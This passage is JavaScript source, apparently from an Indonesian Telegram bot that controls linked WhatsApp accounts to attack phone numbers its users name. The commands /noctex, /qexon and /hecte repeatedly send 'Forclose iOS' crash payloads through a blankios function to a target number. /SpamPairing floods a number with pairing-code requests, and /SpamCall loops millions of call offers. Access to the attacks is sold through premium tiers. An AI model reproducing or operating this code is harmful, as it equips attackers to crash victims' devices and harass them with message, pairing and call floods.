    return bot.sendMessage(chatId, "❌ Command /noctex sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /noctex`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios Invisible 
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 50; i++) {
      await blankios(sock, target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios Invisible 
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/qexon (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/qexon"] === true) {
    return bot.sendMessage(chatId, "❌ Command /qexon sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /qexon`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 50; i++) {
      await blankios(sock, target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/hecte (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/hecte"] === true) {
    return bot.sendMessage(chatId, "❌ Command /hecte sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /hecte`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 50; i++) {
      await blankios(sock, target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/nr8exs.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`js
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`js
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

const bugCommands = [
  "/xbugs", "/xkill", "/xynerx", "/xivorx",
  "/zypherx", "/forexit", "/noctex", "/foreclx",
  "/qexon", "/forcloz", "/fconemsg", "/delaygc", "/hecte", "/blankgc", "/forceclick", "/Blank", "/buldozer", "/makloe", "/neyrx", "/xspam", "/xoya", "/xfc", "BlankV2"
];
let commandLocks = {};
for (const cmd of bugCommands) commandLocks[cmd] = false;
function getStatus(cmd) { return commandLocks[cmd] ? "OFF" : "ONN"; }

bot.onText(/\/kunci (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const cmd = match[1].trim();
  if (!bugCommands.includes(cmd)) return bot.sendMessage(chatId, `❌ Command ${cmd} tidak dikenal.`);
  if (commandLocks[cmd]) return bot.sendMessage(chatId, `⚠️ ${cmd} sudah OFF.`);
  commandLocks[cmd] = true;
  bot.sendMessage(chatId, `🔒 ${cmd} sekarang OFF (terkunci).`);
});

bot.onText(/\/buka (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const cmd = match[1].trim();
  if (!bugCommands.includes(cmd)) return bot.sendMessage(chatId, `❌ Command ${cmd} tidak dikenal.`);
  if (!commandLocks[cmd]) return bot.sendMessage(chatId, `⚠️ ${cmd} sudah ONN.`);
  commandLocks[cmd] = false;
  bot.sendMessage(chatId, `🔓 ${cmd} sekarang ONN (terbuka).`);
});

bot.onText(/\/listlock/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const locked = bugCommands.filter(cmd => commandLocks[cmd]);
  if (locked.length === 0) return bot.sendMessage(chatId, "✅ Semua command dalam keadaan ONN (terbuka).");
  bot.sendMessage(chatId, `🔒 Command terkunci (OFF):\n${locked.map(c => `• ${c}`).join('\n')}`);
});

bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Hanya owner.");
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

